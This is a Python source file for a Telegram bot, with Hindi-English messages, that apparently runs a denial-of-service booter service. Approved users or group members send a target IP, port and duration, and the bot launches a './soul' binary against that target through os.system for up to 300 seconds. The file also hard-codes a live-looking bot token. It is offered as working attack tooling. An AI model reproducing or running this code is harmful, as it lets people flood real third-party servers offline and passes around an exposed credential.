import os
import telebot
import logging
import asyncio
from threading import Thread

TOKEN = "7889670543:AAFtwN5ijyKG2905-X9WvaPS43N1lNh3pyw"
ADMIN_ID = 6207079474  # Replace with your actual admin user ID

bot = telebot.TeleBot(TOKEN)

user_permissions = {}  # Dictionary to store user access status
attack_in_progress = False  # Flag to check if an attack is running

# Start command (when a user starts the bot)
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id

    if message.chat.type == 'private':
        if user_id not in user_permissions or user_permissions[user_id] != 'approved':
            bot.send_message(message.chat.id, "❗ Aapko admin se approval lena hoga pehle. Admin ko DM karein @samy784")
            return
        else:
            bot.send_message(message.chat.id, "🎉 Aapko access mil gaya hai! Attack start karne ke liye ip port duration bejein.\n🙏 Example format: `167.67.25 6296 120`")
            return

    # If it's a group, give automatic access
    user_permissions[user_id] = 'approved'
    bot.send_message(message.chat.id, "🎉 Aapko access mil gaya hai! Attack start karne ke liye ip port duration bejein.\n🙏 Example format: `167.67.25 6296 120`")

# Admin adds a user
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ Aap admin nahi hain! Only the admin can add users.")
        return

    try:
        target_user_id = int(message.text.split()[1])
        user_permissions[target_user_id] = 'approved'
        bot.send_message(target_user_id, "🎉 Aapko access mil gaya hai! Attack start karne ke liye ip port duration bejein.")
        bot.send_message(message.chat.id, f"User {target_user_id} has been added and granted access.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid user ID to add.\nExample: /add 123456789")

# Admin removes a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ Aap admin nahi hain! Only the admin can remove users.")
        return

    try:
        target_user_id = int(message.text.split()[1])
        if target_user_id in user_permissions:
            del user_permissions[target_user_id]
            bot.send_message(target_user_id, "❗ Aapka access remove kar diya gaya hai!")
            bot.send_message(message.chat.id, f"User {target_user_id} has been removed and their access has been revoked.")
        else:
            bot.send_message(message.chat.id, "❗ User not found or doesn't have access.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid user ID to remove.\nExample: /remove 123456789")

# Process IP, Port, Duration for the attack
@bot.message_handler(func=lambda message: message.chat.type != 'private')
@bot.message_handler(func=lambda message: user_permissions.get(message.from_user.id) == 'approved')
def handle_attack_command(message):
    global attack_in_progress
    if attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ Ek attack abhi chal raha hai. Kripya kuch waqt ke baad phir se koshish karein.")
        return
    
    try:
        # Validate if message has exactly 3 parts (IP, Port, Duration)
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❗ Aapka attack format galat hai! Kripya IP, Port aur Duration sahi format mein bhejein.\n"
                                              "Sahi format: `IP Port Duration`\nExample: `167.67.25 6296 120`.")
            return
        
        # Extract the IP, Port, and Duration
        target_ip, target_port, duration = parts
        target_port = int(target_port)
        duration = int(duration)

        # Validate the IP format
        if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
            bot.send_message(message.chat.id, "❗ IP address galat lag raha hai. Kripya valid IP address bhejein.\nExample: `167.67.25.1`.")
            return
        
        # Ensure the duration is within acceptable range
        if duration > 300:
            bot.send_message(message.chat.id, "❗ Attack ka maximum duration 300 seconds hai. Kripya duration kam karein.")
            return
        
        # Set flag to indicate an attack is in progress
        attack_in_progress = True
        bot.send_message(message.chat.id, f"🚀 Attack shuru ho gaya hai!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds.")

        # Execute the attack using the `./soul` command (make sure the soul binary is on your server and executable)
        attack_command = f"./soul {target_ip} {target_port} {duration} 900"
        os.system(attack_command)

        # Once attack is complete, reset the flag and notify the user
        attack_in_progress = False
        bot.send_message(message.chat.id, "🎉 Attack complete ho gaya hai! Agar aap dusra attack start karna chahte hain, toh bas IP, port aur duration bhejein.")

    except ValueError:
        bot.send_message(message.chat.id, "❗ Port aur Duration ke values ko number ke roop mein dena hoga. Kripya sahi values dene ki koshish karein.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❗ Kuch galat ho gaya! Kripya thodi der baad phir se try karein.")
        attack_in_progress = False  # Reset the flag in case of error

# Run the bot
def start_asyncio_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
